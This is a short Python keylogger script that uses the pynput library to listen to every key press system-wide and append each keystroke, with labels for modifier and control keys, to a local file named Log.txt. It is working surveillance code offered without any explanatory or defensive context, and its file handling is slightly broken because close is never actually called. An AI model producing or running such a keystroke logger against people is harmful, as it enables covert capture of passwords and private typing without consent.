from pynput.keyboard import Key,Listener
import sys
import os


def check_file():
    try:
        file = open('Log.txt','a')
    except IOError:
        file = open('Log.txt','w')
    finally:
        file.close


def on_press(key):
    try:
        file = open('Log.txt','a')
        if(str(key) == 'Key.ctrl_l'):
              file.write(' CTRL_L ')
        elif(str(key) == 'Key.alt_l'):
              file.write(' ALT_L ')
        elif(str(key) == 'Key.shift'):
              file.write(' SHIFT_L ')
        elif(str(key) == 'Key.caps_lock'):
              file.write(' CAPS_LOCK ')
        elif(str(key) == 'Key.tab'):
              file.write(' TAB ')
        elif(str(key) == 'Key.space'):
              file.write(' SPACE ')
        elif(str(key) == 'Key.alt_r'):
              file.write(' ALT_R ')
        elif(str(key) == 'Key.ctrl_r'):
              file.write(' CTRL_R ')
        elif(str(key) == 'Key.shift_r'):
              file.write(' SHIFT_R ')
        elif(str(key) == 'Key.enter'):
              file.write('ENTER')
        elif(str(key) == 'Key.backspace'):
              file.write(' BACKSPACE ')
        elif(str(key) == 'Key.esc'):
              file.write(' ESC ')
        else:
              file.write(str(key))
    except AttributeError:
        file.write(key.name)
    finally:
        file.close


def start():
    check_file()
    lis = Listener(on_press = on_press)
    lis.start()
    lis.join()


start()
